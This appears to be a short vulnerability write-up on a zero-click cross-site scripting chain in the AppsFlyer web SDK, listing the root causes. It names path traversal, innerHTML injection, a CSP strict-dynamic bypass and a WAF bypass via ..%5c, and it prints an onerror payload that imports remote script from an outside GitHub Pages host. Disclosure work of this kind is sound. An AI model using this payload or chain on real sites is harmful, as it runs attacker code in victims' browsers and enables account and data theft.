How the Zero-Click Works

  1. Path traversal: af-sb-id has no validation. ../../ traverses to attacker's AF workspace.
  2. Auto-render: SDK calls showBanner() on page load → fetches attacker's creative → injects via innerHTML.
  3. Zero-click payload: Creative layout contains <img src=x onerror="import('//s1n6h.github.io/x.js')">. When innerHTML parses it, the image fails to load → onerror fires automatically → imports and executes x.js on the victim's origin.
  4. CSP bypass (strict-dynamic): SDK's _inject() creates <script> via createElement + innerHTML → dynamically inserted scripts are trusted under strict-dynamic.
  5. WAF bypass: Backslash ..%5c bypasses CloudFront WAF. Browser normalizes \ → / (WHATWG URL spec).

Payload: x.js

Hosted at: https://s1n6h.github.io/x.js

Root Causes (all in AppsFlyer SDK)

  1. No validation on af-sb-id before URL construction
  2. No HTML sanitization in _createElement() — raw innerHTML sink
  3. No filtering of onerror / onload / javascript: in creative layouts
  4. Creative script field injected via createElement('script') — bypasses CSP
